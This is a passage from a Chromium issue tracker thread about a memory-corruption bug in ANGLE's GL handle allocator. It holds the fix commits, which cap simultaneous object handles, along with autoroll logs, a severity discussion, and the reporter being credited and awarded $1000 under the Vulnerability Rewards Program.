    Commit-Queue: Yuxin Hu <yuxinhu@google.com>

```

---

Files:

- M `src/libANGLE/HandleAllocator_unittest.cpp`

---

Hash: [a212e75c20582dd8bdca8e0c26b8eea8320fff8a](https://chromiumdash.appspot.com/commit/a212e75c20582dd8bdca8e0c26b8eea8320fff8a)  

Date: Sat Nov 1 03:51:39 2025


---

### dx...@google.com (2025-11-01)

Project: chromium/src  

Branch:  main  

Author:  chromium-autoroll [chromium-autoroll@skia-public.iam.gserviceaccount.com](mailto:chromium-autoroll@skia-public.iam.gserviceaccount.com)  

Link:    <https://chromium-review.googlesource.com/7107290>

Roll ANGLE from 48abd1a75d36 to a212e75c2058 (9 revisions)

---


Expand for full commit details
```
     
    https://chromium.googlesource.com/angle/angle.git/+log/48abd1a75d36..a212e75c2058 
     
    2025-11-01 yuxinhu@google.com Temporarily remove the test that fails ios_simulator compilation 
    2025-11-01 angle-autoroll@skia-public.iam.gserviceaccount.com Manual Roll vulkan-deps from 4e1fe2e715a8 to 5fd342985be6 
    2025-11-01 mark@lunarg.com Trace/Replay: Enable extensions on side-contexts 
    2025-11-01 yuxinhu@google.com Add OVR_multiview_multisampled_render_to_texture entry points 
    2025-11-01 yuxinhu@google.com Fix chromium ios_simulator compilation error 
    2025-10-31 syoussefi@chromium.org Port ShaderStorageBuffer compiler tests to end2end 
    2025-10-31 liza@chromium.org Use CheckedNumerics in HandleAllocator 
    2025-10-31 syoussefi@chromium.org Port AtomicCounter compiler tests to end2end 
    2025-10-31 syoussefi@chromium.org Reduce the permutations of clear-texture tests 
     
    If this roll has caused a breakage, revert this CL and stop the roller 
    using the controls here: 
    https://autoroll.skia.org/r/angle-chromium-autoroll 
    Please CC angle-team@google.com,yuxinhu@google.com on the revert to ensure that a human 
    is aware of the problem. 
     
    To file a bug in ANGLE: https://bugs.chromium.org/p/angleproject/issues/entry 
    To file a bug in Chromium: https://bugs.chromium.org/p/chromium/issues/entry 
     
    To report a problem with the AutoRoller itself, please file a bug: 
    https://issues.skia.org/issues/new?component=1389291&template=1850622 
     
    Documentation for the AutoRoller is here: 
    https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md 
     
    Cq-Include-Trybots: luci.chromium.try:android_optional_gpu_tests_rel;luci.chromium.try:linux_optional_gpu_tests_rel;luci.chromium.try:mac_optional_gpu_tests_rel;luci.chromium.try:win_optional_gpu_tests_rel;luci.chromium.try:linux-swangle-try-x64;luci.chromium.try:win-swangle-try-x86 
    Bug: chromium:452209503 
    Tbr: yuxinhu@google.com 
    Test: Test: angle_trace_tests --gtest_filter=*lost_light 
    Change-Id: I380ad8dd0a5d4be04cee215ff9ac7d93953403b0 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7107290 
    Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Bot-Commit: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Cr-Commit-Position: refs/heads/main@{#1538969}

```

---

Files:

- M `DEPS`
- M `third_party/angle`

---

Hash: [ba0663d79e4d62965c265fa596d7c3476c4bbe83](https://chromiumdash.appspot.com/commit/ba0663d79e4d62965c265fa596d7c3476c4bbe83)  

Date: Sat Nov 1 08:09:22 2025


---

### li...@chromium.org (2025-11-05)

I had started working on properly updating the allocate call to throw an error, but Geoff has beaten me to it and is further along than me so I'm reassigning to him.

We also chatted more about the memory requirements for exploiting this, and I think it's even more unlikely for this to be in exploitable in practice as I forgot that the GPU process also has memory limits, for that reason I think this is more of a low severity bug.

### dx...@google.com (2025-11-12)

Project: angle/angle  

Branch:  main  

Author:  Geoff Lang [geofflang@chromium.org](mailto:geofflang@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7127342>

Set an upper limit on simultaneous GL object handles.

---


Expand for full commit details
```
     
    Generate GL_OUT_OF_MEMORY when attempting to allocate more than 2^24 
    simultaneous object handles of the same type. Update the HandleAllocator 
    to communicate allocation failures. 
     
    This protects us from theoretically exhausting the GLuint ID range and 
    crashing as well as limits the ability for WebGL to easily generate many 
    allocations. 
     
    Bug: angleproject:457772564, chromium:452209503 
    Change-Id: I9cee19115f4c50ebe53497706155fe6fa422d654 
    Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/7127342 
    Reviewed-by: Liza Burakova <liza@chromium.org> 
    Commit-Queue: Geoff Lang <geofflang@chromium.org>

```

---

Files:

- M `scripts/code_generation_hashes/GL_EGL_entry_points.json`
- M `scripts/generate_entry_points.py`
- M `src/libANGLE/Constants.h`
- M `src/libANGLE/Context.cpp`
- M `src/libANGLE/Context.h`
- M `src/libANGLE/Context_gles_3_0_autogen.h`
- M `src/libANGLE/Display.cpp`
- M `src/libANGLE/ErrorStrings.h`
- M `src/libANGLE/GLES1Renderer.cpp`
- M `src/libANGLE/HandleAllocator.cpp`
- M `src/libANGLE/HandleAllocator.h`
- M `src/libANGLE/HandleAllocator_unittest.cpp`
- M `src/libANGLE/PixelLocalStorage.cpp`
- M `src/libANGLE/ResourceManager.cpp`
- M `src/libANGLE/ResourceManager.h`
- M `src/libANGLE/ResourceManager_unittest.cpp`
- M `src/libANGLE/State.cpp`
- M `src/libANGLE/State.h`
- M `src/libANGLE/capture/FrameCapture.cpp`
- M `src/libANGLE/context_private_call.inl.h`
- M `src/libANGLE/context_private_call_autogen.h`
- M `src/libANGLE/validationES2.cpp`
- M `src/libANGLE/validationES3.cpp`
- M `src/libANGLE/validationES3_autogen.h`
- M `src/libANGLE/validationESEXT_autogen.h`
- M `src/libGLESv2/entry_points_gles_3_0_autogen.cpp`
- M `src/libGLESv2/entry_points_gles_ext_autogen.cpp`

---

Hash: [e156412823246a4d68a7e39f65995f9a5ce6c2e4](https://chromiumdash.appspot.com/commit/e156412823246a4d68a7e39f65995f9a5ce6c2e4)  

Date: Thu Nov 6 20:45:43 2025


---

### dx...@google.com (2025-11-14)

Project: chromium/src  

Branch:  main  

Author:  chromium-autoroll [chromium-autoroll@skia-public.iam.gserviceaccount.com](mailto:chromium-autoroll@skia-public.iam.gserviceaccount.com)  

Link:    <https://chromium-review.googlesource.com/7158515>

Roll ANGLE from 2a42e887afc0 to c74a9835b0bf (46 revisions)

---


Expand for full commit details
```
     
    https://chromium.googlesource.com/angle/angle.git/+log/2a42e887afc0..c74a9835b0bf 
     
    2025-11-14 cclao@google.com Vulkan: Ensure CommandsState::mPrimaryCommands access with lock 
    2025-11-14 cclao@google.com Vulkan: Move mProtectionType/mContextPriority to CommandsState 
    2025-11-14 angle-autoroll@skia-public.iam.gserviceaccount.com Roll Chromium from 716d16312708 to 833c16a28549 (581 revisions) 
    2025-11-14 cclao@google.com Vulkan: Remove mWaitSemaphores from ContextVk 
    2025-11-14 m.maiya@samsung.com Vulkan: Featurize support for GL_EXT_fragment_shading_rate* 
    2025-11-13 syoussefi@chromium.org Port EXT_clip_cull_distance_test validation tests to end2nd 
    2025-11-13 syoussefi@chromium.org Port EXT_shader_framebuffer_fetch validation tests to end2nd 
    2025-11-13 syoussefi@chromium.org Port EXT_YUV_target validation tests to end2nd 
    2025-11-13 syoussefi@chromium.org Port EXT_blend_func_extended validation tests to end2nd 
    2025-11-13 angle-autoroll@skia-public.iam.gserviceaccount.com Roll Chromium from 3a69151393ca to 716d16312708 (625 revisions) 
    2025-11-13 cclao@google.com Vulkan: Remove imagesToTransitionToForeign from submitCommands 
    2025-11-12 cclao@google.com Vulkan: Disable preferSubmitAtFBOBoundary 
    2025-11-12 syoussefi@chromium.org Fail link if blocks exceed max size limits 
    2025-11-12 cclao@google.com Vulkan: Split DepthStencil LoadStoreOp tests to its own class 
    2025-11-12 somswapnadeep69@gmail.com Port Shader validation compiler tests to end2end 
    2025-11-12 liza@chromium.org [WebGPU] Implement texture copies with CPU readback 
    2025-11-12 geofflang@chromium.org Set an upper limit on simultaneous GL object handles. 
    2025-11-12 angle-autoroll@skia-public.iam.gserviceaccount.com Roll Chromium from c2b2f0b7b9a6 to 3a69151393ca (577 revisions) 
    2025-11-12 syoussefi@chromium.org Vulkan: Clarify GLSL translation to SPIR-V 
    2025-11-12 timvp@google.com GLSLOutputGLSLTest: Mark as not needing to be instantiated 
    2025-11-12 cclao@google.com Vulkan: Delete ImageHelper::initFromCreateInfo 
    2025-11-11 geofflang@chromium.org HandleAllocator: remove mBaseValue and mNextValue. 
    2025-11-11 cclao@google.com Vulkan: Make CommandsState per ContextVk 
    2025-11-11 xin.yuan@arm.com Add the combinations for sRGB related format types 
    2025-11-11 cnorthrop@google.com Revert "Vulkan: Enable dynamic rendering on newer PowerVR drivers" 
    2025-11-11 i.nazarov@samsung.com Vulkan: Follow up fixes for writeTimestamp and QueryHelper 
    2025-11-11 angle-autoroll@skia-public.iam.gserviceaccount.com Roll vulkan-deps from 8b98214dd92d to 3114945eb0e3 (16 revisions) 
    2025-11-11 angle-autoroll@skia-public.iam.gserviceaccount.com Roll Chromium from c56a646a9557 to c2b2f0b7b9a6 (556 revisions) 
    2025-11-10 cnorthrop@google.com Tests: Add Love and Deepspace trace 
    2025-11-10 jisunnie.lee@samsung.com Translator: Document workaround for OES_EGL_image_external 
    2025-11-10 lehoangquyen@chromium.org Allow ReadPixels to use persistently mapped PBO 
    2025-11-10 angle-autoroll@skia-public.iam.gserviceaccount.com Roll vulkan-deps from a34bdd1b0084 to 8b98214dd92d (16 revisions) 
    2025-11-10 angle-autoroll@skia-public.iam.gserviceaccount.com Roll VK-GL-CTS from 7434af6e04aa to fe5018f2cf90 (17 revisions) 
    2025-11-10 angle-autoroll@skia-public.iam.gserviceaccount.com Roll Chromium from a8efe4138221 to c56a646a9557 (809 revisions) 
    2025-11-08 roberto_rodriguez2@apple.com Clamp up to base level in Metal backend 
    2025-11-08 syoussefi@chromium.org Port needs-#extension compiler tests to end2end 
    2025-11-07 angle-autoroll@skia-public.iam.gserviceaccount.com Roll SwiftShader from 153470c12fdf to f474b0ce14a6 (2 revisions) 
    2025-11-07 angle-autoroll@skia-public.iam.gserviceaccount.com Roll vulkan-deps from 2599d7d26547 to a34bdd1b0084 (7 revisions) 
    2025-11-07 angle-autoroll@skia-public.iam.gserviceaccount.com Roll Chromium from befe71267627 to a8efe4138221 (535 revisions) 
    2025-11-06 cclao@google.com Vulkan: Avoid unnecessary loop in FramebufferVk::invalidateImpl 
    2025-11-06 angle-autoroll@skia-public.iam.gserviceaccount.com Roll vulkan-deps from 5a075c3f5e7c to 2599d7d26547 (8 revisions) 
    2025-11-06 angle-autoroll@skia-public.iam.gserviceaccount.com Roll Chromium from 6a8aff520270 to befe71267627 (600 revisions) 
    2025-11-06 cnorthrop@google.com Vulkan: Enable dynamic rendering on newer PowerVR drivers 
    2025-11-05 cclao@google.com Vulkan: Add ASSERT in RenderTargetVk that image has ATTACHMENT 
    2025-11-05 syoussefi@chromium.org Vulkan: Speculative fix for Linux Mint loader crash 
    2025-11-05 abdolrashidi@google.com Vulkan: Optimize buffer size for vertex attributes 
     
    If this roll has caused a breakage, revert this CL and stop the roller 
    using the controls here: 
    https://autoroll.skia.org/r/angle-chromium-autoroll 
    Please CC angle-team@google.com,geofflang@google.com on the revert to ensure that a human 
    is aware of the problem. 
     
    To file a bug in ANGLE: https://bugs.chromium.org/p/angleproject/issues/entry 
    To file a bug in Chromium: https://bugs.chromium.org/p/chromium/issues/entry 
     
    To report a problem with the AutoRoller itself, please file a bug: 
    https://issues.skia.org/issues/new?component=1389291&template=1850622 
     
    Documentation for the AutoRoller is here: 
    https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md 
     
    Cq-Include-Trybots: luci.chromium.try:android_optional_gpu_tests_rel;luci.chromium.try:linux_optional_gpu_tests_rel;luci.chromium.try:mac_optional_gpu_tests_rel;luci.chromium.try:win_optional_gpu_tests_rel;luci.chromium.try:linux-swangle-try-x64;luci.chromium.try:win-swangle-try-x86 
    Bug: chromium:452209503,chromium:456079970,chromium:459950605 
    Tbr: geofflang@google.com 
    Test: Test: Trace performance 
    Test: Test: angle_end2end_tests --gtest_filter=GoogleTestVerification* 
    Test: Test: angle_trace_tests --gtest_filter=*love_and_deepspace 
    Change-Id: I173ec7d1baa0bc04246c234fa8edb912338a87c8 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7158515 
    Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Bot-Commit: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Cr-Commit-Position: refs/heads/main@{#1545237}

```

---

Files:

- M `DEPS`
- M `third_party/angle`

---

Hash: [94f74afb9f5d600beb4bafb36f856c0b9ae93c55](https://chromiumdash.appspot.com/commit/94f74afb9f5d600beb4bafb36f856c0b9ae93c55)  

Date: Fri Nov 14 21:40:10 2025


---

### gl...@gmail.com (2025-12-08)

It’s been some time since the code patch landed; is there any update on the status, or on whether this issue might be considered for VRP rewards or a CVE assignment?

### aw...@google.com (2026-01-12)

geofflang@, can this be marked as fixed? The last commit was in M144 which is going stable tomorrow, so want to know if we can consider the security bug addressed. Thanks!

### aw...@google.com (2026-01-13)

Reporter: how would you like to be credited in the Chrome release notes?

### gl...@gmail.com (2026-01-13)

Thanks for checking in.

Please credit me as Glitchers BoB 14th. in the Chrome release notes.

### wf...@chromium.org (2026-01-30)

This is considered highly mitigated due to discussion above, but the VRP panel still believes this warrants a reward as it is a memory corruption (despite likely being very hard to turn into an exploit that harms our users).

### sp...@google.com (2026-01-30)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $1000.00 for this report.

Rationale for this decision:
Highly Mitigated Memory corruption in a non-sandboxed process


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-04-22)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/452209503)*
